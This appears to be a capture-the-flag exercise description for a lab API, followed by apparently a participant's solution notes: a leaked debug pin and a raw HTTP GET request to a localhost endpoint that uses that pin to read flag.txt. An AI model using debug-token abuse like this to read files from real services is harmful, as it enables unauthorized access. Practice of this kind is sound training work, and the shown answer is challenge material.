Michael And Orlando 

API Challenge: Retrieve the Flag
Introduction
Welcome to the API challenge! Your mission is to explore the documentation for a custom API that we’ve set up. At the bottom of this page, you’ll find a link to the API documentation. Your goal is to retrieve the flag by following the steps outlined below.

Steps to Retrieve the Flag
API Documentation:
Visit the API documentation (link provided below).
Familiarize yourself with the available endpoints and their functionalities.
Debugging Token:
In the API documentation, search for the default API debugging token.
This token will be necessary for authentication.
Make a POST Request:
Using the debugging token, make a POST request to the API.
The endpoint will return a list of files that the API has access to.
One of these files will be named flag.txt.
Retrieve the Flag:
Once you identify flag.txt, make a GET request to the API specifically for that file.
The contents of flag.txt will reveal the flag!

deBugpin=335-818-834
fileName=a1bsbahiwaosadbajskdaioo812y483432bubuafb8ab8fbdufebufabpfa.txt
____________________________

GET http://127.0.0.1/apiV1-usr?debugPin=335-818-834&fileName=flag.txt HTTP/1.1
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: Windows
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache, no-store
Host: 127.0.0.1

